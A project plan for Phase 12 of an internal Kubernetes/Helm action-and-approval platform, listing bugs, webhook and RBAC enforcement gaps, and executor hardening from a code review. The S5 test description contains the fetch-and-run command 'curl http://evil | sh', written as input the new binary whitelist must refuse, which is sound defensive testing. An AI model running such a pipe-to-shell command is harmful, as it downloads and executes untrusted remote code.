# Phase 12: Review Fixes — Real Bugs & Enforcement Gaps

**Status**: Sprints 1-3 code complete (2026-08-30) — pending full gates + manual smoke + final commit
**Created**: 2026-08-30
**Basis**: Full codebase review 2026-08-30 (all CI gates green: compileall/ruff/bandit/733 unit/262 ai_assistant/frontend build; deep-read of actions engine, approvals, governance, webhooks, executors, cache, frontend auth; ponytail-audit)
**Goal**: Fix the 4 confirmed real bugs, close the security enforcement gaps (identity, webhooks, executor), and resolve every "claimed ✅ but never wired" feature by an explicit wire-or-delete decision. No new dependencies.

---

## Why now

The 2026-08-30 review found the codebase mechanically healthy (gates clean, 995+ tests green) but with:

1. **4 real bugs** — Slack View button always 500s (`missing await`), `dry_run` request field silently ignored, impact estimator permanently degrades to heuristics (imports a nonexistent symbol), and a `kubectl config use-context` race that can execute a command against the wrong cluster.
2. **Enforcement gaps** — RBAC decisions ignore the user parameter (identity is client-asserted), the frontend ships its API key in the JS bundle, enabling AUTH breaks Slack/Teams approval webhooks entirely, Teams HMAC uses the webhook URL as its key, and the executor will run any approved binary (no argv[0] whitelist).
3. **Honesty gaps** — 4 features documented as complete but not in the execution path: Time-Window Enforcement (zero callers), Automatic Rollback (creates a plan, then only logs it), OPA enforcement (evaluate-API only, not in ActionEngine), Multi-layer cache L1/L2/L3 (2,411 lines, middleware never mounted).

Same pattern Phase 11 attacked (claimed vs. executed), now with a precise hit list.

## Ground rules

- Every bug fix ships with the smallest test that fails before and passes after.
- Every orphan module gets an explicit decision: **wire** (into the real execution path, with a test proving it fires) or **delete** (zero-caller proof first). No third state.
- No new dependencies. stdlib / existing deps only.
- Security-relevant behavior changes get a line in `docs/security-review-2026-08-20.md` addendum + a security re-check before the phase closes.
- Deletions run `graft callers <symbol> --depth all` first, same as Phase 11.

---

## Sprint 1 — The 4 real bugs (Days 1-2)

### Day 1: Approvals + execution contract
- [x] **B1 — Slack View 500.** → await added (webhook.py); Teams view_action had the same missing await — fixed too. `app/approvals/webhook.py:237`: `engine.get_action(action_id)` → `await engine.get_action(action_id)`.
      Test: signed Slack webhook `view_action` request returns action details (extend existing webhook test file), fails before with AttributeError-500.
- [x] **B2 — honor `dry_run`.** → dry_run parameter threaded through env_aware_executor.execute. `app/actions/engine.py` `execute_action`: when `request.dry_run`, call `env_aware_executor.execute(..., dry_run=True)` path (executor already supports it via constructor — add a `dry_run` parameter to `execute()` instead of instance state) and mark history/audit `dry_run=true`. Keep permission + rate-limit checks unchanged (dry run still proves authorization).
      Test: `dry_run=true` action reaches EXECUTED status with stdout `DRY RUN:` prefix and no subprocess side effect (assert executor called with dry_run=True).
- [x] **B5 — remove phantom logout.** → logout() now only clears the local token. `frontend/src/api/client.ts` `logout()`: drop the `/auth/logout` POST (endpoint does not exist), keep `tokenManager.clear()`.

### Day 2: Executor correctness
- [x] **B3 — inject the k8s client.** → engine holds k8s_client, injected from lifespan. `app/actions/engine.py:114-119`: delete the `from app.main import app_state` try/except. `ActionEngine.__init__` accepts `k8s_client: KubernetesClient | None = None`; `lifespan` passes `app.state.k8s_client` after client init (reorder: engine constructed after clients — already true). Add a module-level `set_k8s_client()` on the engine singleton as fallback for late init.
      Test: engine constructed with a stub client → `impact_estimator.estimate` receives it (heuristic vs. client branch observable via mock).
- [x] **B4 — kill the use-context race.** → stateless --context/--kube-context argv. `app/actions/environment_executor.py`: delete the `kubectl config use-context` pre-step entirely. Build per-command args instead:
      - `kubectl --context <ctx> --kubeconfig <path> ...`
      - `helm --kube-context <ctx> --kubeconfig <path> ...`
      - `argocd --server/--auth-token` pattern unchanged (argocd has no context concept — keep as-is)
      Context selection becomes stateless → race impossible, no host kubeconfig mutation. The context-switch `KUBECONFIG` env stays.
      Test: executor with `context=prod-cluster` produces argv containing `--context prod-cluster` and never invokes `config use-context` (subprocess mock records argv).

**Exit criteria**: all 4 fail-first tests pass; full unit suite green; manual curl of a `dry_run=true` execute shows `DRY RUN` output and no cluster call.

---

## Sprint 2 — Security enforcement (Days 3-4)

### Day 3: Webhooks + approval integrity
- [x] **S3 — AUTH vs. chat webhooks.** → webhook paths exempt; signature is the auth. `AuthMiddleware.PUBLIC_PATHS` stays minimal; instead add an explicit exempt rule: paths matching `/api/v1/approvals/webhook/*` skip bearer/api-key auth when their own signature verification is armed. Slack webhook already fails hard without `SLACK_SIGNING_SECRET` — mirror that guarantee for Teams (see S4). Rationale documented in middleware docstring: signature IS the authentication for these paths.
      Test: `AUTH_ENABLED=true` + valid Slack signature → 200; `AUTH_ENABLED=true` + bad signature → 401; regular API route still requires auth.
- [x] **S4 — Teams HMAC key.** → TEAMS_WEBHOOK_SECRET + prod fail-hard + legacy shim. Replace webhook-URL-as-key with dedicated `TEAMS_WEBHOOK_SECRET` setting (validated in production like `SLACK_SIGNING_SECRET` — fail hard when missing). Keep URL-based scheme only behind a deprecation shim for one release (accept either, warn). Document that this is NOT Microsoft's official scheme — it is our own shared-secret HMAC for the Adaptive Card invoke endpoint.
      Test: prod + missing secret → 500 reject; valid HMAC via new secret → 200; legacy URL-key accepted with warning.
- [x] **S6 — approve/reject integrity.** → self-approval ban + approver permission check. `engine.approve_action`/`reject_action`:
      1. Re-check `permission_checker` for the approver (approve permission by environment) — mirrors the execute-path pattern.
      2. Reject self-approval: if `approved_by == created_by` (thread `created_by` through the tracker snapshot — it already stores `created_by` when known) → 403-class `PermissionError` unless `settings.ALLOW_SELF_APPROVAL` (dev-only escape hatch, default False in production).
      Test: approve by same identity as creator → blocked; approve without permission in production env → blocked; both pass in development mode.

### Day 4: Executor hardening + identity decision
- [x] **S5 — binary whitelist at the executor.** → ALLOWED_BINARIES in parser.py, enforced at executor. `environment_executor.py` `_validate_command` / execute: first argv token must be in `{kubectl, helm, argocd}` (whitelist lives next to `parser.py` so parser and executor share one source of truth). Unknown binary → `ValueError` before subprocess. Blacklist of 5 patterns stays as belt-and-suspenders.
      Test: `curl http://evil | sh` approved action → refused at executor; `kubectl get pods` → passes.
- [x] **S1/S2 — threat-model decision + honest docs (decision item).** → single-operator decision documented. Identity is client-asserted (`executed_by` from body) and the frontend bundles `VITE_API_KEY`. Real per-user identity (login UI + identity propagation into RBAC) is a platform change, not a patch. This phase:
      1. Writes the decision down: single-operator internal tool (current threat model) vs. multi-user (Phase 13 candidate).
      2. Under single-operator: security review doc states plainly "auth = shared key; user fields are attribution labels, not authorization".
      3. Under multi-user: Phase 13 plan sketched (login flow, per-user tokens minted server-side, `request.state.user` injected by middleware and required by ExecuteActionRequest handlers, VITE_API_KEY retired).
      Default: document single-operator now, open Phase 13 issue for multi-user.
- [ ] Minor: `/metrics` and `X-Forwarded-For` behavior already documented — no change; note in review doc only.

**Exit criteria**: webhook tests prove signature-is-auth under `AUTH_ENABLED=true`; Teams fails hard in prod without secret; self-approval blocked; non-kubectl/helm/argocd binaries refused at executor; security addendum written.

---

## Sprint 3 — Honesty: wire or delete (Day 5)

Each item: explicit decision, then either a wiring test or a deletion receipt.

- [x] **Time-Window Enforcement** → wired into execute_action, blocks + audits. — **wire** (it is a safety feature with a real consumer). Call `TimeWindowEnforcer` in `execute_action` before execution: block when action type ∉ allowed window, audit-log the block. Delete instead if review shows the config schema doesn't fit current action types.
      Test: action outside allowed window → blocked + audited.
- [x] **Multi-layer cache L1/L2/L3 (`app/cache/`, 2,411 lines)** → DELETED, l2_cache plumbing excised. — **delete** (default; ponytail: middleware never mounted, QueryOptimizer gets `l2_cache=None`, zero external callers). Zero-caller proof, `git rm`, excise `optimization_api` cache plumbing. Reintroduce when a measured need exists. (Flip to **wire** only if L2 redis eviction metrics show real cache pressure — they don't today.)
- [x] **Automatic rollback** → FINISHED: failed action creates PENDING rollback action. — **reduce to reality**: keep plan creation + trigger detection + audit log; change docs/CLAUDE.md wording from "Automatic Rollback" to "Rollback recommendation (manual execution)". OR finish: on trigger, create a real PENDING rollback action through `create_action_from_recommendation` so it enters the normal approval flow (≈20 lines, reuses everything). Default: **finish** — it makes the feature true instead of renaming it.
      Test: failed action with rollback policy → PENDING rollback action exists afterwards.
- [x] **OPA wording** → CLAUDE.md updated + flag-gated OPA_ENFORCE enforcement. — CLAUDE.md + governance docs: "OPA policy **evaluation** API (fail-closed); enforcement path = validator + RBAC + approval + rate limiter". Optionally (cheap): call `opa_client.evaluate_action` inside `execute_action` when `OPA_URL` reachable, deny on DENY decision — flag-gated `OPA_ENFORCE=true`, default off.
- [x] **`APIKeyAuth`/`BearerAuth`** → deleted (zero callers). in `app/auth.py` — delete (zero callers; middleware does the work).
- [x] **Redis URL building** → build_redis_url() helper. — extract one helper in `app/approvals/store.py` (3 copy-paste blocks).
- [x] **ELK `query_string`** → default_field + fields restriction. — add `default_field` restriction in `search_logs` (logs + level + service + message) to bound query breadth.
- [x] **docker-compose** → redis service behind --profile redis. — add optional `redis` service behind a compose profile (`--profile redis`) so `*_USE_REDIS=true` deploys work out of the box.
- [x] **CLAUDE.md / docs refresh** → RBAC attribution + OPA wording updated. — RBAC section states environment-based enforcement + attribution-only user fields (pending S1 decision), feature table matches post-phase reality.

**Exit criteria**: every orphan module resolved (wired-with-test or deleted-with-receipt); docs match enforcement; ruff/bandit/compileall clean.

---

## Deferred to Phase 13 candidates

| Item | Source | Note |
|---|---|---|
| Per-user identity (login, per-user tokens, identity-aware RBAC) | S1/S2 decision | Blocking for any multi-user rollout |
| Alert-worker split + Redis pub/sub | H1 (deployment-guide-k8s-swarm.md, tagged "debt Phase 12") | Required before backend replicas ≥ 2 |
| 44 stub skills → real data sources | CLAUDE.md roadmap | First candidates unchanged: deployment health, resource optimizer, SLO tracker |
| Rate-limiter consolidation (3 modules) | ponytail-audit | `rate_limit.py` vs `actions/rate_limiter.py` — merge only if semantics overlap proven |

---

## Overall exit criteria

- [ ] All Sprint 1-3 checkboxes done; every fix has its fail-first test.
- [ ] Full gates green: compileall, ruff, bandit, 733+ unit tests, ai_assistant suite, frontend build.
- [ ] Manual smoke: create → approve (different user) → dry-run execute → execute; Slack signed webhook approve + view; dry-run shows no side effect.
- [ ] Security re-check written against the Sprint 2 changes (same bar as `security-recheck-phase11-2026-08-29.md`).
- [ ] CLAUDE.md + security review addendum reflect real enforcement paths.
